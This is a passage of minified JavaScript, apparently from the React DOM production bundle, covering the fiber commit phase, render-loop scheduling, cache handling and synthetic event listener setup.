b=n.shared.hiddenCallbacks;if(b!==null)for(n.shared.hiddenCallbacks=null,n=0;n<b.length;n++)Ku(b[n],h)}catch(C){Te(a,a.return,C)}}l&&c&64&&nf(s),Hn(s,s.return);break;case 27:cf(s);case 26:case 5:rl(n,s,l),l&&a===null&&c&4&&of(s),Hn(s,s.return);break;case 12:rl(n,s,l);break;case 31:rl(n,s,l),l&&c&4&&pf(n,s);break;case 13:rl(n,s,l),l&&c&4&&mf(n,s);break;case 22:s.memoizedState===null&&rl(n,s,l),Hn(s,s.return);break;case 30:break;default:rl(n,s,l)}t=t.sibling}}function vr(e,t){var l=null;e!==null&&e.memoizedState!==null&&e.memoizedState.cachePool!==null&&(l=e.memoizedState.cachePool.pool),e=null,t.memoizedState!==null&&t.memoizedState.cachePool!==null&&(e=t.memoizedState.cachePool.pool),e!==l&&(e!=null&&e.refCount++,l!=null&&An(l))}function yr(e,t){e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&An(e))}function Ut(e,t,l,a){if(t.subtreeFlags&10256)for(t=t.child;t!==null;)bf(e,t,l,a),t=t.sibling}function bf(e,t,l,a){var n=t.flags;switch(t.tag){case 0:case 11:case 15:Ut(e,t,l,a),n&2048&&kn(9,t);break;case 1:Ut(e,t,l,a);break;case 3:Ut(e,t,l,a),n&2048&&(e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&An(e)));break;case 12:if(n&2048){Ut(e,t,l,a),e=t.stateNode;try{var s=t.memoizedProps,c=s.id,h=s.onPostCommit;typeof h=="function"&&h(c,t.alternate===null?"mount":"update",e.passiveEffectDuration,-0)}catch(b){Te(t,t.return,b)}}else Ut(e,t,l,a);break;case 31:Ut(e,t,l,a);break;case 13:Ut(e,t,l,a);break;case 23:break;case 22:s=t.stateNode,c=t.alternate,t.memoizedState!==null?s._visibility&2?Ut(e,t,l,a):Ln(e,t):s._visibility&2?Ut(e,t,l,a):(s._visibility|=2,Va(e,t,l,a,(t.subtreeFlags&10256)!==0||!1)),n&2048&&vr(c,t);break;case 24:Ut(e,t,l,a),n&2048&&yr(t.alternate,t);break;default:Ut(e,t,l,a)}}function Va(e,t,l,a,n){for(n=n&&((t.subtreeFlags&10256)!==0||!1),t=t.child;t!==null;){var s=e,c=t,h=l,b=a,C=c.flags;switch(c.tag){case 0:case 11:case 15:Va(s,c,h,b,n),kn(8,c);break;case 23:break;case 22:var D=c.stateNode;c.memoizedState!==null?D._visibility&2?Va(s,c,h,b,n):Ln(s,c):(D._visibility|=2,Va(s,c,h,b,n)),n&&C&2048&&vr(c.alternate,c);break;case 24:Va(s,c,h,b,n),n&&C&2048&&yr(c.alternate,c);break;default:Va(s,c,h,b,n)}t=t.sibling}}function Ln(e,t){if(t.subtreeFlags&10256)for(t=t.child;t!==null;){var l=e,a=t,n=a.flags;switch(a.tag){case 22:Ln(l,a),n&2048&&vr(a.alternate,a);break;case 24:Ln(l,a),n&2048&&yr(a.alternate,a);break;default:Ln(l,a)}t=t.sibling}}var Un=8192;function Pa(e,t,l){if(e.subtreeFlags&Un)for(e=e.child;e!==null;)vf(e,t,l),e=e.sibling}function vf(e,t,l){switch(e.tag){case 26:Pa(e,t,l),e.flags&Un&&e.memoizedState!==null&&fx(l,Lt,e.memoizedState,e.memoizedProps);break;case 5:Pa(e,t,l);break;case 3:case 4:var a=Lt;Lt=po(e.stateNode.containerInfo),Pa(e,t,l),Lt=a;break;case 22:e.memoizedState===null&&(a=e.alternate,a!==null&&a.memoizedState!==null?(a=Un,Un=16777216,Pa(e,t,l),Un=a):Pa(e,t,l));break;default:Pa(e,t,l)}}function yf(e){var t=e.alternate;if(t!==null&&(e=t.child,e!==null)){t.child=null;do t=e.sibling,e.sibling=null,e=t;while(e!==null)}}function Bn(e){var t=e.deletions;if((e.flags&16)!==0){if(t!==null)for(var l=0;l<t.length;l++){var a=t[l];Je=a,Af(a,e)}yf(e)}if(e.subtreeFlags&10256)for(e=e.child;e!==null;)Sf(e),e=e.sibling}function Sf(e){switch(e.tag){case 0:case 11:case 15:Bn(e),e.flags&2048&&_l(9,e,e.return);break;case 3:Bn(e);break;case 12:Bn(e);break;case 22:var t=e.stateNode;e.memoizedState!==null&&t._visibility&2&&(e.return===null||e.return.tag!==13)?(t._visibility&=-3,eo(e)):Bn(e);break;default:Bn(e)}}function eo(e){var t=e.deletions;if((e.flags&16)!==0){if(t!==null)for(var l=0;l<t.length;l++){var a=t[l];Je=a,Af(a,e)}yf(e)}for(e=e.child;e!==null;){switch(t=e,t.tag){case 0:case 11:case 15:_l(8,t,t.return),eo(t);break;case 22:l=t.stateNode,l._visibility&2&&(l._visibility&=-3,eo(t));break;default:eo(t)}e=e.sibling}}function Af(e,t){for(;Je!==null;){var l=Je;switch(l.tag){case 0:case 11:case 15:_l(8,l,t);break;case 23:case 22:if(l.memoizedState!==null&&l.memoizedState.cachePool!==null){var a=l.memoizedState.cachePool.pool;a!=null&&a.refCount++}break;case 24:An(l.memoizedState.cache)}if(a=l.child,a!==null)a.return=l,Je=a;else e:for(l=e;Je!==null;){a=Je;var n=a.sibling,s=a.return;if(ff(a),a===l){Je=null;break e}if(n!==null){n.return=s,Je=n;break e}Je=s}}}var Cg={getCacheForType:function(e){var t=Ie(qe),l=t.data.get(e);return l===void 0&&(l=e(),t.data.set(e,l)),l},cacheSignal:function(){return Ie(qe).controller.signal}},wg=typeof WeakMap=="function"?WeakMap:Map,ye=0,Re=null,de=null,he=0,Ae=0,At=null,zl=!1,Xa=!1,Sr=!1,cl=0,Le=0,Ol=0,ha=0,Ar=0,Tt=0,Qa=0,Gn=null,dt=null,Tr=!1,to=0,Tf=0,lo=1/0,ao=null,kl=null,Xe=0,Hl=null,Ka=null,ul=0,Er=0,Nr=null,Ef=null,qn=0,jr=null;function Et(){return(ye&2)!==0&&he!==0?he&-he:M.T!==null?_r():Bc()}function Nf(){if(Tt===0)if((he&536870912)===0||me){var e=ds;ds<<=1,(ds&3932160)===0&&(ds=262144),Tt=e}else Tt=536870912;return e=yt.current,e!==null&&(e.flags|=32),Tt}function ft(e,t,l){(e===Re&&(Ae===2||Ae===9)||e.cancelPendingCommit!==null)&&(Za(e,0),Ll(e,he,Tt,!1)),rn(e,l),((ye&2)===0||e!==Re)&&(e===Re&&((ye&2)===0&&(ha|=l),Le===4&&Ll(e,he,Tt,!1)),Xt(e))}function jf(e,t,l){if((ye&6)!==0)throw Error(r(327));var a=!l&&(t&127)===0&&(t&e.expiredLanes)===0||on(e,t),n=a?Dg(e,t):wr(e,t,!0),s=a;do{if(n===0){Xa&&!a&&Ll(e,t,0,!1);break}else{if(l=e.current.alternate,s&&!Rg(l)){n=wr(e,t,!1),s=!1;continue}if(n===2){if(s=t,e.errorRecoveryDisabledLanes&s)var c=0;else c=e.pendingLanes&-536870913,c=c!==0?c:c&536870912?536870912:0;if(c!==0){t=c;e:{var h=e;n=Gn;var b=h.current.memoizedState.isDehydrated;if(b&&(Za(h,c).flags|=256),c=wr(h,c,!1),c!==2){if(Sr&&!b){h.errorRecoveryDisabledLanes|=s,ha|=s,n=4;break e}s=dt,dt=n,s!==null&&(dt===null?dt=s:dt.push.apply(dt,s))}n=c}if(s=!1,n!==2)continue}}if(n===1){Za(e,0),Ll(e,t,0,!0);break}e:{switch(a=e,s=n,s){case 0:case 1:throw Error(r(345));case 4:if((t&4194048)!==t)break;case 6:Ll(a,t,Tt,!zl);break e;case 2:dt=null;break;case 3:case 5:break;default:throw Error(r(329))}if((t&62914560)===t&&(n=to+300-mt(),10<n)){if(Ll(a,t,Tt,!zl),hs(a,0,!0)!==0)break e;ul=t,a.timeoutHandle=ah(Cf.bind(null,a,l,dt,ao,Tr,t,Tt,ha,Qa,zl,s,"Throttled",-0,0),n);break e}Cf(a,l,dt,ao,Tr,t,Tt,ha,Qa,zl,s,null,-0,0)}}break}while(!0);Xt(e)}function Cf(e,t,l,a,n,s,c,h,b,C,D,k,w,R){if(e.timeoutHandle=-1,k=t.subtreeFlags,k&8192||(k&16785408)===16785408){k={stylesheets:null,count:0,imgCount:0,imgBytes:0,suspenseyImages:[],waitingForImages:!0,waitingForViewTransition:!1,unsuspend:Jt},vf(t,s,k);var X=(s&62914560)===s?to-mt():(s&4194048)===s?Tf-mt():0;if(X=hx(k,X),X!==null){ul=s,e.cancelPendingCommit=X(kf.bind(null,e,t,s,l,a,n,c,h,b,D,k,null,w,R)),Ll(e,s,c,!C);return}}kf(e,t,s,l,a,n,c,h,b)}function Rg(e){for(var t=e;;){var l=t.tag;if((l===0||l===11||l===15)&&t.flags&16384&&(l=t.updateQueue,l!==null&&(l=l.stores,l!==null)))for(var a=0;a<l.length;a++){var n=l[a],s=n.getSnapshot;n=n.value;try{if(!bt(s(),n))return!1}catch{return!1}}if(l=t.child,t.subtreeFlags&16384&&l!==null)l.return=t,t=l;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function Ll(e,t,l,a){t&=~Ar,t&=~ha,e.suspendedLanes|=t,e.pingedLanes&=~t,a&&(e.warmLanes|=t),a=e.expirationTimes;for(var n=t;0<n;){var s=31-xt(n),c=1<<s;a[s]=-1,n&=~c}l!==0&&Hc(e,l,t)}function no(){return(ye&6)===0?(Yn(0),!1):!0}function Cr(){if(de!==null){if(Ae===0)var e=de.return;else e=de,$t=na=null,Vi(e),Ua=null,En=0,e=de;for(;e!==null;)af(e.alternate,e),e=e.return;de=null}}function Za(e,t){var l=e.timeoutHandle;l!==-1&&(e.timeoutHandle=-1,Jg(l)),l=e.cancelPendingCommit,l!==null&&(e.cancelPendingCommit=null,l()),ul=0,Cr(),Re=e,de=l=Ft(e.current,null),he=t,Ae=0,At=null,zl=!1,Xa=on(e,t),Sr=!1,Qa=Tt=Ar=ha=Ol=Le=0,dt=Gn=null,Tr=!1,(t&8)!==0&&(t|=t&32);var a=e.entangledLanes;if(a!==0)for(e=e.entanglements,a&=t;0<a;){var n=31-xt(a),s=1<<n;t|=e[n],a&=~s}return cl=t,Ns(),l}function wf(e,t){oe=null,M.H=_n,t===La||t===zs?(t=Vu(),Ae=3):t===Di?(t=Vu(),Ae=4):Ae=t===sr?8:t!==null&&typeof t=="object"&&typeof t.then=="function"?6:1,At=t,de===null&&(Le=1,Ks(e,wt(t,e.current)))}function Rf(){var e=yt.current;return e===null?!0:(he&4194048)===he?_t===null:(he&62914560)===he||(he&536870912)!==0?e===_t:!1}function Mf(){var e=M.H;return M.H=_n,e===null?_n:e}function Df(){var e=M.A;return M.A=Cg,e}function so(){Le=4,zl||(he&4194048)!==he&&yt.current!==null||(Xa=!0),(Ol&134217727)===0&&(ha&134217727)===0||Re===null||Ll(Re,he,Tt,!1)}function wr(e,t,l){var a=ye;ye|=2;var n=Mf(),s=Df();(Re!==e||he!==t)&&(ao=null,Za(e,t)),t=!1;var c=Le;e:do try{if(Ae!==0&&de!==null){var h=de,b=At;switch(Ae){case 8:Cr(),c=6;break e;case 3:case 2:case 9:case 6:yt.current===null&&(t=!0);var C=Ae;if(Ae=0,At=null,Ja(e,h,b,C),l&&Xa){c=0;break e}break;default:C=Ae,Ae=0,At=null,Ja(e,h,b,C)}}Mg(),c=Le;break}catch(D){wf(e,D)}while(!0);return t&&e.shellSuspendCounter++,$t=na=null,ye=a,M.H=n,M.A=s,de===null&&(Re=null,he=0,Ns()),c}function Mg(){for(;de!==null;)_f(de)}function Dg(e,t){var l=ye;ye|=2;var a=Mf(),n=Df();Re!==e||he!==t?(ao=null,lo=mt()+500,Za(e,t)):Xa=on(e,t);e:do try{if(Ae!==0&&de!==null){t=de;var s=At;t:switch(Ae){case 1:Ae=0,At=null,Ja(e,t,s,1);break;case 2:case 9:if(qu(s)){Ae=0,At=null,zf(t);break}t=function(){Ae!==2&&Ae!==9||Re!==e||(Ae=7),Xt(e)},s.then(t,t);break e;case 3:Ae=7;break e;case 4:Ae=5;break e;case 7:qu(s)?(Ae=0,At=null,zf(t)):(Ae=0,At=null,Ja(e,t,s,7));break;case 5:var c=null;switch(de.tag){case 26:c=de.memoizedState;case 5:case 27:var h=de;if(c?bh(c):h.stateNode.complete){Ae=0,At=null;var b=h.sibling;if(b!==null)de=b;else{var C=h.return;C!==null?(de=C,oo(C)):de=null}break t}}Ae=0,At=null,Ja(e,t,s,5);break;case 6:Ae=0,At=null,Ja(e,t,s,6);break;case 8:Cr(),Le=6;break e;default:throw Error(r(462))}}_g();break}catch(D){wf(e,D)}while(!0);return $t=na=null,M.H=a,M.A=n,ye=l,de!==null?0:(Re=null,he=0,Ns(),Le)}function _g(){for(;de!==null&&!tm();)_f(de)}function _f(e){var t=tf(e.alternate,e,cl);e.memoizedProps=e.pendingProps,t===null?oo(e):de=t}function zf(e){var t=e,l=t.alternate;switch(t.tag){case 15:case 0:t=Jd(l,t,t.pendingProps,t.type,void 0,he);break;case 11:t=Jd(l,t,t.pendingProps,t.type.render,t.ref,he);break;case 5:Vi(t);default:af(l,t),t=de=Mu(t,cl),t=tf(l,t,cl)}e.memoizedProps=e.pendingProps,t===null?oo(e):de=t}function Ja(e,t,l,a){$t=na=null,Vi(t),Ua=null,En=0;var n=t.return;try{if(yg(e,n,t,l,he)){Le=1,Ks(e,wt(l,e.current)),de=null;return}}catch(s){if(n!==null)throw de=n,s;Le=1,Ks(e,wt(l,e.current)),de=null;return}t.flags&32768?(me||a===1?e=!0:Xa||(he&536870912)!==0?e=!1:(zl=e=!0,(a===2||a===9||a===3||a===6)&&(a=yt.current,a!==null&&a.tag===13&&(a.flags|=16384))),Of(t,e)):oo(t)}function oo(e){var t=e;do{if((t.flags&32768)!==0){Of(t,zl);return}e=t.return;var l=Tg(t.alternate,t,cl);if(l!==null){de=l;return}if(t=t.sibling,t!==null){de=t;return}de=t=e}while(t!==null);Le===0&&(Le=5)}function Of(e,t){do{var l=Eg(e.alternate,e);if(l!==null){l.flags&=32767,de=l;return}if(l=e.return,l!==null&&(l.flags|=32768,l.subtreeFlags=0,l.deletions=null),!t&&(e=e.sibling,e!==null)){de=e;return}de=e=l}while(e!==null);Le=6,de=null}function kf(e,t,l,a,n,s,c,h,b){e.cancelPendingCommit=null;do io();while(Xe!==0);if((ye&6)!==0)throw Error(r(327));if(t!==null){if(t===e.current)throw Error(r(177));if(s=t.lanes|t.childLanes,s|=gi,dm(e,l,s,c,h,b),e===Re&&(de=Re=null,he=0),Ka=t,Hl=e,ul=l,Er=s,Nr=n,Ef=a,(t.subtreeFlags&10256)!==0||(t.flags&10256)!==0?(e.callbackNode=null,e.callbackPriority=0,Hg(cs,function(){return Gf(),null})):(e.callbackNode=null,e.callbackPriority=0),a=(t.flags&13878)!==0,(t.subtreeFlags&13878)!==0||a){a=M.T,M.T=null,n=G.p,G.p=2,c=ye,ye|=4;try{Ng(e,t,l)}finally{ye=c,G.p=n,M.T=a}}Xe=1,Hf(),Lf(),Uf()}}function Hf(){if(Xe===1){Xe=0;var e=Hl,t=Ka,l=(t.flags&13878)!==0;if((t.subtreeFlags&13878)!==0||l){l=M.T,M.T=null;var a=G.p;G.p=2;var n=ye;ye|=4;try{gf(t,e);var s=Gr,c=Su(e.containerInfo),h=s.focusedElem,b=s.selectionRange;if(c!==h&&h&&h.ownerDocument&&yu(h.ownerDocument.documentElement,h)){if(b!==null&&di(h)){var C=b.start,D=b.end;if(D===void 0&&(D=C),"selectionStart"in h)h.selectionStart=C,h.selectionEnd=Math.min(D,h.value.length);else{var k=h.ownerDocument||document,w=k&&k.defaultView||window;if(w.getSelection){var R=w.getSelection(),X=h.textContent.length,te=Math.min(b.start,X),Ce=b.end===void 0?te:Math.min(b.end,X);!R.extend&&te>Ce&&(c=Ce,Ce=te,te=c);var E=vu(h,te),y=vu(h,Ce);if(E&&y&&(R.rangeCount!==1||R.anchorNode!==E.node||R.anchorOffset!==E.offset||R.focusNode!==y.node||R.focusOffset!==y.offset)){var j=k.createRange();j.setStart(E.node,E.offset),R.removeAllRanges(),te>Ce?(R.addRange(j),R.extend(y.node,y.offset)):(j.setEnd(y.node,y.offset),R.addRange(j))}}}}for(k=[],R=h;R=R.parentNode;)R.nodeType===1&&k.push({element:R,left:R.scrollLeft,top:R.scrollTop});for(typeof h.focus=="function"&&h.focus(),h=0;h<k.length;h++){var _=k[h];_.element.scrollLeft=_.left,_.element.scrollTop=_.top}}yo=!!Br,Gr=Br=null}finally{ye=n,G.p=a,M.T=l}}e.current=t,Xe=2}}function Lf(){if(Xe===2){Xe=0;var e=Hl,t=Ka,l=(t.flags&8772)!==0;if((t.subtreeFlags&8772)!==0||l){l=M.T,M.T=null;var a=G.p;G.p=2;var n=ye;ye|=4;try{df(e,t.alternate,t)}finally{ye=n,G.p=a,M.T=l}}Xe=3}}function Uf(){if(Xe===4||Xe===3){Xe=0,lm();var e=Hl,t=Ka,l=ul,a=Ef;(t.subtreeFlags&10256)!==0||(t.flags&10256)!==0?Xe=5:(Xe=0,Ka=Hl=null,Bf(e,e.pendingLanes));var n=e.pendingLanes;if(n===0&&(kl=null),Qo(l),t=t.stateNode,gt&&typeof gt.onCommitFiberRoot=="function")try{gt.onCommitFiberRoot(sn,t,void 0,(t.current.flags&128)===128)}catch{}if(a!==null){t=M.T,n=G.p,G.p=2,M.T=null;try{for(var s=e.onRecoverableError,c=0;c<a.length;c++){var h=a[c];s(h.value,{componentStack:h.stack})}}finally{M.T=t,G.p=n}}(ul&3)!==0&&io(),Xt(e),n=e.pendingLanes,(l&261930)!==0&&(n&42)!==0?e===jr?qn++:(qn=0,jr=e):qn=0,Yn(0)}}function Bf(e,t){(e.pooledCacheLanes&=t)===0&&(t=e.pooledCache,t!=null&&(e.pooledCache=null,An(t)))}function io(){return Hf(),Lf(),Uf(),Gf()}function Gf(){if(Xe!==5)return!1;var e=Hl,t=Er;Er=0;var l=Qo(ul),a=M.T,n=G.p;try{G.p=32>l?32:l,M.T=null,l=Nr,Nr=null;var s=Hl,c=ul;if(Xe=0,Ka=Hl=null,ul=0,(ye&6)!==0)throw Error(r(331));var h=ye;if(ye|=4,Sf(s.current),bf(s,s.current,c,l),ye=h,Yn(0,!1),gt&&typeof gt.onPostCommitFiberRoot=="function")try{gt.onPostCommitFiberRoot(sn,s)}catch{}return!0}finally{G.p=n,M.T=a,Bf(e,t)}}function qf(e,t,l){t=wt(l,t),t=nr(e.stateNode,t,2),e=Rl(e,t,2),e!==null&&(rn(e,2),Xt(e))}function Te(e,t,l){if(e.tag===3)qf(e,e,l);else for(;t!==null;){if(t.tag===3){qf(t,e,l);break}else if(t.tag===1){var a=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof a.componentDidCatch=="function"&&(kl===null||!kl.has(a))){e=wt(l,e),l=qd(2),a=Rl(t,l,2),a!==null&&(Yd(l,a,t,e),rn(a,2),Xt(a));break}}t=t.return}}function Rr(e,t,l){var a=e.pingCache;if(a===null){a=e.pingCache=new wg;var n=new Set;a.set(t,n)}else n=a.get(t),n===void 0&&(n=new Set,a.set(t,n));n.has(l)||(Sr=!0,n.add(l),e=zg.bind(null,e,t,l),t.then(e,e))}function zg(e,t,l){var a=e.pingCache;a!==null&&a.delete(t),e.pingedLanes|=e.suspendedLanes&l,e.warmLanes&=~l,Re===e&&(he&l)===l&&(Le===4||Le===3&&(he&62914560)===he&&300>mt()-to?(ye&2)===0&&Za(e,0):Ar|=l,Qa===he&&(Qa=0)),Xt(e)}function Yf(e,t){t===0&&(t=kc()),e=ta(e,t),e!==null&&(rn(e,t),Xt(e))}function Og(e){var t=e.memoizedState,l=0;t!==null&&(l=t.retryLane),Yf(e,l)}function kg(e,t){var l=0;switch(e.tag){case 31:case 13:var a=e.stateNode,n=e.memoizedState;n!==null&&(l=n.retryLane);break;case 19:a=e.stateNode;break;case 22:a=e.stateNode._retryCache;break;default:throw Error(r(314))}a!==null&&a.delete(t),Yf(e,l)}function Hg(e,t){return Yo(e,t)}var ro=null,Wa=null,Mr=!1,co=!1,Dr=!1,Ul=0;function Xt(e){e!==Wa&&e.next===null&&(Wa===null?ro=Wa=e:Wa=Wa.next=e),co=!0,Mr||(Mr=!0,Ug())}function Yn(e,t){if(!Dr&&co){Dr=!0;do for(var l=!1,a=ro;a!==null;){if(e!==0){var n=a.pendingLanes;if(n===0)var s=0;else{var c=a.suspendedLanes,h=a.pingedLanes;s=(1<<31-xt(42|e)+1)-1,s&=n&~(c&~h),s=s&201326741?s&201326741|1:s?s|2:0}s!==0&&(l=!0,Qf(a,s))}else s=he,s=hs(a,a===Re?s:0,a.cancelPendingCommit!==null||a.timeoutHandle!==-1),(s&3)===0||on(a,s)||(l=!0,Qf(a,s));a=a.next}while(l);Dr=!1}}function Lg(){Vf()}function Vf(){co=Mr=!1;var e=0;Ul!==0&&Zg()&&(e=Ul);for(var t=mt(),l=null,a=ro;a!==null;){var n=a.next,s=Pf(a,t);s===0?(a.next=null,l===null?ro=n:l.next=n,n===null&&(Wa=l)):(l=a,(e!==0||(s&3)!==0)&&(co=!0)),a=n}Xe!==0&&Xe!==5||Yn(e),Ul!==0&&(Ul=0)}function Pf(e,t){for(var l=e.suspendedLanes,a=e.pingedLanes,n=e.expirationTimes,s=e.pendingLanes&-62914561;0<s;){var c=31-xt(s),h=1<<c,b=n[c];b===-1?((h&l)===0||(h&a)!==0)&&(n[c]=um(h,t)):b<=t&&(e.expiredLanes|=h),s&=~h}if(t=Re,l=he,l=hs(e,e===t?l:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),a=e.callbackNode,l===0||e===t&&(Ae===2||Ae===9)||e.cancelPendingCommit!==null)return a!==null&&a!==null&&Vo(a),e.callbackNode=null,e.callbackPriority=0;if((l&3)===0||on(e,l)){if(t=l&-l,t===e.callbackPriority)return t;switch(a!==null&&Vo(a),Qo(l)){case 2:case 8:l=zc;break;case 32:l=cs;break;case 268435456:l=Oc;break;default:l=cs}return a=Xf.bind(null,e),l=Yo(l,a),e.callbackPriority=t,e.callbackNode=l,t}return a!==null&&a!==null&&Vo(a),e.callbackPriority=2,e.callbackNode=null,2}function Xf(e,t){if(Xe!==0&&Xe!==5)return e.callbackNode=null,e.callbackPriority=0,null;var l=e.callbackNode;if(io()&&e.callbackNode!==l)return null;var a=he;return a=hs(e,e===Re?a:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),a===0?null:(jf(e,a,t),Pf(e,mt()),e.callbackNode!=null&&e.callbackNode===l?Xf.bind(null,e):null)}function Qf(e,t){if(io())return null;jf(e,t,!0)}function Ug(){Wg(function(){(ye&6)!==0?Yo(_c,Lg):Vf()})}function _r(){if(Ul===0){var e=ka;e===0&&(e=us,us<<=1,(us&261888)===0&&(us=256)),Ul=e}return Ul}function Kf(e){return e==null||typeof e=="symbol"||typeof e=="boolean"?null:typeof e=="function"?e:xs(""+e)}function Zf(e,t){var l=t.ownerDocument.createElement("input");return l.name=t.name,l.value=t.value,e.id&&l.setAttribute("form",e.id),t.parentNode.insertBefore(l,t),e=new FormData(e),l.parentNode.removeChild(l),e}function Bg(e,t,l,a,n){if(t==="submit"&&l&&l.stateNode===n){var s=Kf((n[ot]||null).action),c=a.submitter;c&&(t=(t=c[ot]||null)?Kf(t.formAction):c.getAttribute("formAction"),t!==null&&(s=t,c=null));var h=new Ss("action","action",null,a,n);e.push({event:h,listeners:[{instance:null,listener:function(){if(a.defaultPrevented){if(Ul!==0){var b=c?Zf(n,c):new FormData(n);Ii(l,{pending:!0,data:b,method:n.method,action:s},null,b)}}else typeof s=="function"&&(h.preventDefault(),b=c?Zf(n,c):new FormData(n),Ii(l,{pending:!0,data:b,method:n.method,action:s},s,b))},currentTarget:n}]})}}for(var zr=0;zr<mi.length;zr++){var Or=mi[zr],Gg=Or.toLowerCase(),qg=Or[0].toUpperCase()+Or.slice(1);Ht(Gg,"on"+qg)}Ht(Eu,"onAnimationEnd"),Ht(Nu,"onAnimationIteration"),Ht(ju,"onAnimationStart"),Ht("dblclick","onDoubleClick"),Ht("focusin","onFocus"),Ht("focusout","onBlur"),Ht(ag,"onTransitionRun"),Ht(ng,"onTransitionStart"),Ht(sg,"onTransitionCancel"),Ht(Cu,"onTransitionEnd"),Sa("onMouseEnter",["mouseout","mouseover"]),Sa("onMouseLeave",["mouseout","mouseover"]),Sa("onPointerEnter",["pointerout","pointerover"]),Sa("onPointerLeave",["pointerout","pointerover"]),Fl("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),Fl("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),Fl("onBeforeInput",["compositionend","keypress","textInput","paste"]),Fl("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),Fl("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),Fl("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Vn="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Yg=new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(Vn));function Jf(e,t){t=(t&4)!==0;for(var l=0;l<e.length;l++){var a=e[l],n=a.event;a=a.listeners;e:{var s=void 0;if(t)for(var c=a.length-1;0<=c;c--){var h=a[c],b=h.instance,C=h.currentTarget;if(h=h.listener,b!==s&&n.isPropagationStopped())break e;s=h,n.currentTarget=C;try{s(n)}catch(D){Es(D)}n.currentTarget=null,s=b}else for(c=0;c<a.length;c++){if(h=a[c],b=h.instance,C=h.currentTarget,h=h.listener,b!==s&&n.isPropagationStopped())break e;s=h,n.currentTarget=C;try{s(n)}catch(D){Es(D)}n.currentTarget=null,s=b}}}}function fe(e,t){var l=t[Ko];l===void 0&&(l=t[Ko]=new Set);var a=e+"__bubble";l.has(a)||(Wf(t,e,2,!1),l.add(a))}function kr(e,t,l){var a=0;t&&(a|=4),Wf(l,e,a,t)}var uo="_reactListening"+Math.random().toString(36).slice(2);function Hr(e){if(!e[uo]){e[uo]=!0,Yc.forEach(function(l){l!=="selectionchange"&&(Yg.has(l)||kr(l,!1,e),kr(l,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[uo]||(t[uo]=!0,kr("selectionchange",!1,t))}}function Wf(e,t,l,a){switch(Nh(t)){case 2:var n=gx;break;case 8:n=xx;break;default:n=Fr}l=n.bind(null,t,l,e),n=void 0,!li||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(n=!0),a?n!==void 0?e.addEventListener(t,l,{capture:!0,passive:n}):e.addEventListener(t,l,!0):n!==void 0?e.addEventListener(t,l,{passive:n}):e.addEventListener(t,l,!1)}function Lr(e,t,l,a,n){var s=a;if((t&1)===0&&(t&2)===0&&a!==null)e:for(;;){if(a===null)return;var c=a.tag;if(c===3||c===4){var h=a.stateNode.containerInfo;if(h===n)break;if(c===4)for(c=a.return;c!==null;){var b=c.tag;if((b===3||b===4)&&c.stateNode.containerInfo===n)return;c=c.return}for(;h!==null;){if(c=ba(h),c===null)return;if(b=c.tag,b===5||b===6||b===26||b===27){a=s=c;continue e}h=h.parentNode}}a=a.return}eu(function(){var C=s,D=ei(l),k=[];e:{var w=wu.get(e);if(w!==void 0){var R=Ss,X=e;switch(e){case"keypress":if(vs(l)===0)break e;case"keydown":case"keyup":R=km;break;case"focusin":X="focus",R=oi;break;case"focusout":X="blur",R=oi;break;case"beforeblur":case"afterblur":R=oi;break;case"click":if(l.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":R=au;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":R=Tm;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":R=Um;break;case Eu:case Nu:case ju:R=jm;break;case Cu:R=Gm;break;case"scroll":case"scrollend":R=Sm;break;case"wheel":R=Ym;break;case"copy":case"cut":case"paste":R=wm;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":R=su;break;case"toggle":case"beforetoggle":R=Pm}var te=(t&4)!==0,Ce=!te&&(e==="scroll"||e==="scrollend"),E=te?w!==null?w+"Capture":null:w;te=[];for(var y=C,j;y!==null;){var _=y;if(j=_.stateNode,_=_.tag,_!==5&&_!==26&&_!==27||j===null||E===null||(_=dn(y,E),_!=null&&te.push(Pn(y,_,j))),Ce)break;y=y.return}0<te.length&&(w=new R(w,X,null,l,D),k.push({event:w,listeners:te}))}}if((t&7)===0){e:{if(w=e==="mouseover"||e==="pointerover",R=e==="mouseout"||e==="pointerout",w&&l!==$o&&(X=l.relatedTarget||l.fromElement)&&(ba(X)||X[xa]))break e;if((R||w)&&(w=D.window===D?D:(w=D.ownerDocument)?w.defaultView||w.parentWindow:window,R?(X=l.relatedTarget||l.toElement,R=C,X=X?ba(X):null,X!==null&&(Ce=p(X),te=X.tag,X!==Ce||te!==5&&te!==27&&te!==6)&&(X=null)):(R=null,X=C),R!==X)){if(te=au,_="onMouseLeave",E="onMouseEnter",y="mouse",(e==="pointerout"||e==="pointerover")&&(te=su,_="onPointerLeave",E="onPointerEnter",y="pointer"),Ce=R==null?w:un(R),j=X==null?w:un(X),w=new te(_,y+"leave",R,l,D),w.target=Ce,w.relatedTarget=j,_=null,ba(D)===C&&(te=new te(E,y+"enter",X,l,D),te.target=j,te.relatedTarget=Ce,_=te),Ce=_,R&&X)t:{for(te=Vg,E=R,y=X,j=0,_=E;_;_=te(_))j++;_=0;for(var 